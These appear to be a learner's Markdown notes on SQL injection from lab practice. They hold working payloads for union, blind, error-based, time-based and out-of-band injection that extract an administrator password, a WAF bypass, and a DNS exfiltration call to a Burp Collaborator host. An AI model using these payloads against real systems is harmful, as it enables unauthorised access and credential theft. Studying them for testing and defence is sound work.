# SQL injection

basicaly a vulnerabily where you have an input value
that you can manipulate
and is insecurely send to the sql database
thus giving us access more access then we should have


## note
sometimes a + needs to be used in stead of spaces

## payloads explained

simplest is:
test' OR 1=1 --

this completes the query with test
but then closes it
add the OR operator
1=1 making any query correct
-- commenting out the rest of the line

sometimes payloads dont just work,
fe in the url they sometimes could need to be url encoded to work

## union selects

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
using this we can determine if there can be selected more collums

after determining the collumns
we can use the following to search for a particular string
' UNION SELECT 'searchstring',NULL,NULL--
' UNION SELECT NULL,'searchstring',NULL--
' UNION SELECT NULL,NULL,'searchstring'--

union abuse is using union statement
to merge another table
' UNION SELECT user,password FROM users--

if there arent enough collumns
you could concatenate another collumns
' UNION SELECT username || '~' || password FROM users--
|| '~' || this is a seperator in an oracle database

## gathering extra info
using builtin stuff,
combining with for example a UNION

Database type           Query
Microsoft, MySQL        SELECT @@version
Oracle                  SELECT * FROM v$version
PostgreSQL              SELECT version()

## schema
most databases have a table with the schema
this is a table containing info of the tables
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

first gathering the collumns
' ORDER BY 2--

then gather the tables
' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--

then gathering the columns of the table
' UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE table_name = 'foundtablename'--
or if being uncertain this reveals all collumns with table name to search in
' UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns--

after finding the collumn names we can use these and the specific table to gather info we need to know
' UNION SELECT columnname1,columnname2 FROM tablename--

## blind injection
is more difficult,
it does not directly show the content of the query
but it changes a response fe showing a welcome message

fe
xyz' AND '1'='1
xyz' AND '1'='2
the first would show the welcome message
but the second would not bcs it would be false

after determining the difference you'd need to check the password 1by1
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
if its true the first character fo the password is greater than m
thus trying the next its half we can narrow down the correct password
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's

abcdefghijklmnopqrstuvwxyz0123456789

ofc its tedious to do this for longer passwords
thus using chatgpt you can write a quick "bruteforcer"
see "script/sql_blind.py"

## error based
even harder

like the blind injection
we get another output in the errors
thus making it throw a different error based on if anything is true or false

first testing
'
gives an error
showing us we get a syntax error
''
shows its fixed showing no error

givesn another error
'||(SELECT '')||'

fixes the error
'||(SELECT '' FROM dual)||'

trying a nonexistant table gives an error
'||(SELECT '' FROM tryingannonexistanttable)||'

trying to get some users
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'


when recieving an error we get the error
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

if we find a user we can determine the password length
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

then checking the char at each location
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

ofc this will take to long to do
thus we write ask gpt to ask make a script
see "script/sql_error.py"


verbose erroring
sometimes a usefull error is returned like syntax error ' on line...
trying with a cast we could maybe get useful data out oof it
CAST((SELECT example_column FROM example_table) AS int)

'
this gave an error
'--
fixed the error
' AND CAST((SELECT 1) AS int)--
another error
' AND 1=CAST((SELECT 1) AS int)--
fixed the previous error
now inserting our generic select
' AND 1=CAST((SELECT username FROM users) AS int)--
we got an error that showed our query being cut of so removing the part of the original cookie fixed this
' AND 1=CAST((SELECT username FROM users) AS int)--
errorr says to much rows
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
errorr now says the first username
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
and just changing to get the password retrieves us the credentials

## time based sql
basicaly the sql executes but doesnt return anything different
but we could try to insert a delay based on if something is true
as the webapps are executed synchronously we could manipulate this
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
'%3BSELECT+CASE+WHEN+(YOUR-CONDITION-HERE)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

first testing the different responses
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
then getting a username from a table
'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
then getting its password length
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>50)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
and then getting bruteforcing the password
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

ofc this is tedious and we let our buddy gpt
write a script for it "script/sql_timed.py"

## out-of-band (OAST) technique
if a different thread is used to execute the query
then we could try to get info by performing a network query to a server we control

most time dns could be used to extract data bcs dns most times doesnt get blocked bcs its essential for normal operations
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--

sometimes not only a string is used
but it could be hidden in xml or json

fe xml
1+1
1 UNION SELECT username || '~' || password FROM users
got us detected by a waf
<@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>
abusing a feature of xml
gets us bypassing it

## stored sql
is saving the sql input somewhere for later use
then later gets abused

## how to prevent
use prepared statements,
parameter based querys,
instead of string concatenations,
prohibit a list of words that can exist in fields


## payloads

stored in the root folder: payloads_sql.lst

https://portswigger.net/web-security/sql-injection/cheat-sheet
